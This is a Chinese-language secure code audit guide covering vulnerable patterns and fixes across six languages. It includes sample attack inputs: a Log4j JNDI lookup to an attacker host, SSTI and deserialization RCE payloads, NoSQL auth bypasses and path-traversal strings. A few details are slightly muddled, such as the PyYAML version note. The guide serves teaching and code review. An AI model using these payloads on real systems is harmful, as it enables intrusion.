## 二、多语言漏洞模式

### 2.1 Java 安全审计

**反序列化漏洞：**
```java
// 危险：未过滤的反序列化
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // 任意类反序列化 RCE

// 危险：Fastjson 解析
JSON.parseObject(userInput);  // @type 字段控制类加载，详见 fastjson-exploitation 技能

// 危险：YAML 反序列化（Spring Boot 内置 SnakeYAML）
Yaml yaml = new Yaml();
Object obj = yaml.load(userInput);  // !!class 标签 RCE

// 修复：白名单过滤
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.*;!*");
ois.setObjectInputFilter(filter);
// SnakeYAML 修复：yaml.loadAs(userInput, MyClass.class) 或自定义 Constructor 白名单
```

**JNDI 注入：**
```java
// 危险：用户可控的 JNDI 查询
Context ctx = new InitialContext();
Object obj = ctx.lookup(userInput);  // JNDI 注入 RCE（LDAP/RMI）

// 危险：JDBC URL 用户可控（连接字符串注入）
DriverManager.getConnection(userInputUrl);  // jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://...'
```

**表达式注入（SpEL/OGNL/MVEL）：**
```java
// 危险：表达式注入
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // T(java.lang.Runtime) 链
exp.getValue();

// 危险：OGNL（Struts2 历史漏洞面）
OgnlUtil.callMethod(userInput, context, root);

// 危险：模板引擎（Freemarker/Thymeleaf 表达式）
```

**SQL 注入（Java 特有）：**
```java
// 危险：字符串拼接
String sql = "SELECT * FROM users WHERE id = " + userId;
stmt.executeQuery(sql);

// 危险：MyBatis ${}（不转义）vs 安全 #{}
<select id="find">SELECT * FROM users WHERE name = '${name}'</select>  // ${} 拼接
<select id="find">SELECT * FROM users WHERE name = #{name}</select>  // #{} 参数化

// 危险：JPA 原生查询拼接 + JdbcTemplate 拼接
```

**XXE（Java）：**
```java
// 危险：未禁用外部实体的解析器
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
Document doc = factory.newDocumentBuilder().parse(inputStream);

// 危险：SAXParser / XMLInputFactory（StAX）默认配置
// 修复：显式禁用 DOCTYPE 与外部实体
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setXIncludeAware(false);
```

**SSRF（Java）：**
```java
// 危险：用户可控 URL → 内网/云元数据 169.254.169.254
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// 危险：Apache HttpClient / OkHttp 用户可控 URL
// 修复：协议白名单 + IP 解析后校验（防 DNS Rebinding，需二次解析比对）+ 内网段拦截
```

**Log4j2（CVE-2021-44228 类）：**
```java
// 危险：日志记录用户可控内容
log.info("user: " + userInput);  // ${jndi:ldap://attacker/a} 触发 JNDI
// 审计点：全库搜索 log.xxx() 且参数含用户输入的位置，确认 lookup 是否禁用
// 修复：升级 log4j-core >= 2.17.1，或 JVM 参数 -Dlog4j2.formatMsgNoLookups=true
```

**路径遍历/任意文件读写：**
```java
// 危险：getResource / ClassLoader 加载用户可控路径
String path = request.getParameter("file");
new File(baseDir + path);  // ../ 穿越

// 危险：Zip 解压（Zip Slip）
while (entries.hasMoreElements()) {
    ZipEntry entry = entries.nextElement();
    File outFile = new File(outDir, entry.getName());  // ../../../etc/cron.d/evil
}
// 修复：Paths.get(outDir).normalize() 后 startsWith 校验
```

### 2.2 Python 安全审计

```python
# 危险：命令注入
import os
os.system("ping " + user_input)
subprocess.call("cmd " + user_input, shell=True)

# 危险：反序列化
import pickle
data = pickle.loads(user_input)  # __reduce__ RCE
import marshal, shelve  # 同族风险

# 危险：SSTI（Jinja2/Flasks）
from jinja2 import Template
Template(user_input).render()  # {{config}} / {{''.__class__.__mro__[1].__subclasses__()}}

# 危险：SQL 注入
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")       # f-string 拼接
cursor.execute("SELECT ... WHERE id = %s" % user_id)               # % 格式化拼接

# 危险：路径遍历
open(os.path.join(base_dir, user_input))

# 危险：eval/exec/compile
eval(user_input); exec(user_input)

# 危险：YAML 不安全加载
import yaml
yaml.load(user_input)               # Python < 5.1 默认 unsafe
yaml.unsafe_load(user_input)        # 显式 unsafe，!!python/object 标签 RCE
yaml.safe_load(user_input)          # 修复

# 危险：框架路由参数直接进 ORM 未转义（Django 用 queryset 不传字符串）
```

**Python 特有审计点：**
- `os.path.join(base, user_input)` 中 user_input 若以 `/` 开头会**丢弃 base** 实现穿越——需 `os.path.realpath` + `startswith` 校验
- Flask `url_for(endpoint, **values)` 用户可控 endpoint 可访问任意视图（SSTI 之外的越权点）
- Celery 任务队列入口、`eval` 于 ORM 自定义字段（Django `JSONField` + `json.loads`）
- Pickle 攻击面：Redis 缓存、`session.serialize` 配置

### 2.3 Go 安全审计

```go
// 危险：命令注入
cmd := exec.Command("sh", "-c", userInput)  // 用户可控命令；应使用非 shell 参数数组形式
exec.Command("ping", userInput)  // 无 shell 时相对安全，但仍需参数白名单

// 危险：SQL 注入
db.Query("SELECT * FROM users WHERE id = " + id)
db.Query("SELECT * FROM users WHERE id = ?", id)  // 修复：占位符（注意 %s 拼接仍危险）

// 危险：路径遍历
http.ServeFile(w, r, filepath.Join(base, r.URL.Query().Get("file")))
// 需要 filepath.Clean + 前缀校验 + 拒绝 ../

// 危险：SSRF
resp, err := http.Get(userInput)  // 用户可控 URL
// 修复：net.ParseIP + 内网段校验（1024 以内的所有私有/回环/链路本地段）

// 危险：不安全的随机数
token := rand.Int()  // math/rand 可预测（Go 1.20 前全局自动播种仍不安全）
// 修复：crypto/rand

// 危险：模板注入（text/template 用户数据进模板）
tmpl.Execute(w, map[string]interface{}{"Cmd": userInput})  // {{.Cmd}} 可被 {{.Cmd "..."}} 调用

// Go 特有：整数溢出、nil 解引用、竞争条件（map 并发写）
// 修复模式：go vet -printf 等静态检查
```

### 2.4 Node.js / JavaScript 安全审计

```javascript
// 危险：命令注入
const { exec } = require('child_process');
exec('cmd ' + userInput);  // 应使用 execFile 或 {shell:false}

// 危险：原型污染
const merge = (target, source) => {
    for (let key in source) {
        target[key] = source[key];  // __proto__/constructor.prototype 污染
    }
};
// 输入 {"__proto__":{"polluted":true}} 即可污染，继而绕过 isAdmin 校验/污染 Object.prototype

// 危险：NoSQL 注入
db.users.find({ username: req.body.username });
// 输入 {"$gt": ""} 或 {"$ne": null} 绕过认证；{$where: "this.pwd=="} 触发 JS 执行

// 危险：SSTI（Pug/EJS/Handlebars）
const template = require('pug').compile(userInput);
// EJS: <%- include('/etc/passwd') %> 文件读取 / RCE

// 危险：路径遍历
res.sendFile(path.join(__dirname, req.query.file));
// 修复：path.resolve + startsWith 检查 + 拒绝绝对路径

// 危险：原型链上的反序列化（node-serialize / serialize-javascript 旧版）
const unserialize = require('node-serialize').unserialize;
unserialize(userInput);  // {"rce":"_$$ND_FUNC$$_function(){...}()"} RCE

// 危险：正则 DoS（ReDoS）—— 用户可控正则或用户输入触发灾难性回溯
new RegExp(userInput).test(largeString)

// 危险：eval/Function 构造器
eval(userInput); new Function(userInput)();

// 依赖面：__proto__ 污染链（lodash <4.17.11、minimist、qs 历史版本）
```

### 2.5 PHP 安全审计

```php
// 危险：文件包含（LFI/RFI）
include($_GET['page']);
include('php://filter/convert.base64-encode/resource=config');  // 伪协议读源码
// 修复：白名单 + realpath 校验

// 危险：命令执行
system("ping " . $_GET['host']);
exec("cmd " . $_POST['input']);
// 分隔符：; | & || && ` $() \n
// 危险：回调型命令执行 call_user_func($_GET['f'], $_GET['a']);

// 危险：反序列化
unserialize($_GET['data']);  // POP 链 RCE（phar:// 反序列化同样危险，file_exists 也会触发）
// 危险：phar 反序列化（利用 phar:// 协议在文件操作函数处触发）

// 危险：SQL 注入
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// 危险：preg_replace /e 修饰符（5.5 前）
preg_replace('/pattern/e', 'code', $input);

// 危险：类型混淆
if ($user == "admin") { }   // == 宽松比较：0=="admin" 为 true
if ($user === "admin") { }  // === 严格比较（修复）
// 危险：strcmp($user, "admin") 传数组返回 null → 绕过
// 危险：MD5 松散比较（0e... 魔法哈希）

// 危险：文件上传
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $_FILES['file']['name']);
// 需：扩展名/Content-Type/MIME 三重校验 + 随机文件名 + 目录禁止执行

// 危险：.htaccess 覆盖 / 配置泄露
```

### 2.6 C# / .NET 安全审计

```csharp
// 危险：反序列化
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // RCE（BinaryFormatter 已标记 obsolete 禁用）
// 危险：DataContractSerializer / ObjectStateFormatter / LosFormatter / ViewState

// 危险：ViewState 未加密
// EnableViewStateMac=false；应启用机器密钥强加密

// 危险：LDAP 注入
DirectorySearcher searcher = new DirectorySearcher();
searcher.Filter = "(&(cn=" + userInput + "))";  // * 通配符注入、括号闭合注入

// 危险：XPath 注入
XmlNode node = doc.SelectSingleNode("//user[@name='" + userInput + "']");

// 危险：EF Core 原生 SQL / ToList 前拼接
db.Users.FromSqlRaw("SELECT * FROM Users WHERE Name = '" + name + "'");

// 危险：不安全反序列化（Json.NET TypeNameHandling.All）
JsonConvert.DeserializeObject(userInput, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // $type 属性 → RCE
});
// 修复：TypeNameHandling.None 或安全类白名单 + SerializationBinder
```

### 2.7 跨语言漏洞模式对照

| 漏洞类型 | Java | Python | Go | Node.js | PHP | C# |
|---------|------|--------|----|---------|-----|-----|
| SQL 注入 | JDBC/MyBatis ${} | f-string/% | 拼接 | 无（SQL 库为主） | 拼接 | FromSqlRaw |
| 命令注入 | ProcessBuilder 拼接 | os.system/subprocess | exec.Command sh -c | exec/child_process | system/exec | Process.Start |
| 反序列化 | ObjectInputStream/Fastjson | pickle/yaml.unsafe_load | gob（白名单需自建） | node-serialize | unserialize/phar | BinaryFormatter/Json.NET |
| 路径遍历 | File/ClassLoader | open/realpath | http.ServeFile | sendFile | include/readfile | File.ReadAllText |
| SSRF | URL/HttpClient | requests/urllib | http.Get | axios/fetch | curl/file_get_contents | HttpClient |
| 表达式注入 | SpEL/OGNL | eval/exec | text/template | eval/Function | preg_replace /e | DataSet.Select |

**共性审计铁律：** ① 输入验证 ≠ 安全（编码/二次编码/大小写/Unicode 规范化绕过）；② 输出编码看上下文（HTML/JS/URL/CSS/JSON 五类）；③ 框架默认值可能不安全（SnakeYAML、Json.NET 默认配置）。

